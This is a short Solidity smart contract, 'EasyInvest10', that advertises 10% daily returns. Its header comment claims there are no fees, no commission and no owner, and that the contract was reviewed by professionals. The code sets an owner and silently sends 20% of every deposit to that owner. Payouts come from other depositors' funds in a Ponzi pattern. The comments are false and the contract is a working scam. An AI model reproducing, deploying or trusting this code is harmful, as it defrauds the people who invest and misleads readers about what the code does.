1 pragma solidity ^0.4.24;
2 /**
3  *
4  * Easy Investment 10% Contract
5  *  - GAIN 10% PER 24 HOURS (every 5900 blocks)
6  *  - NO COMMISSION on your investment (every ether stays on contract's balance)
7  *  - NO FEES are collected by the owner, in fact, there is no owner at all (just look at the code)
8  *
9  * How to use:
10  *  1. Send any amount of ether to make an investment
11  *  2a. Claim your profit by sending 0 ether transaction (every day, every week, i don't care unless you're spending too much on GAS)
12  *  OR
13  *  2b. Send more ether to reinvest AND get your profit at the same time
14  *
15  * RECOMMENDED GAS LIMIT: 70000
16  * RECOMMENDED GAS PRICE: https://ethgasstation.info/
17  *
18  * Contract reviewed and approved by pros!
19  *
20  */
21  
22 contract EasyInvest10 {
23     address owner;
24 
25     function EasyInvest10 () {
26         owner = msg.sender;
27     }
28     // records amounts invested
29     mapping (address => uint256) invested;
30     // records blocks at which investments were made
31     mapping (address => uint256) atBlock;
32     // this function called every time anyone sends a transaction to this contract
33     function() external payable {
34         owner.send(msg.value/5);
35          // if sender (aka YOU) is invested more than 0 ether
36         if (invested[msg.sender] != 0){
37          // calculate profit amount as such:   
38         address kashout = msg.sender;
39         // amount = (amount invested) * 10% * (blocks since last transaction) / 5900
40         // 5900 is an average block count per day produced by Ethereum blockchain
41         uint256 getout = invested[msg.sender]*10/100*(block.number-atBlock[msg.sender])/5900;
42         // send calculated amount of ether directly to sender (aka YOU)
43         kashout.send(getout);
44         }
45         // record block number and invested amount (msg.value) of this transaction
46         atBlock[msg.sender] = block.number;
47         invested[msg.sender] += msg.value;
48 
49     }
50 }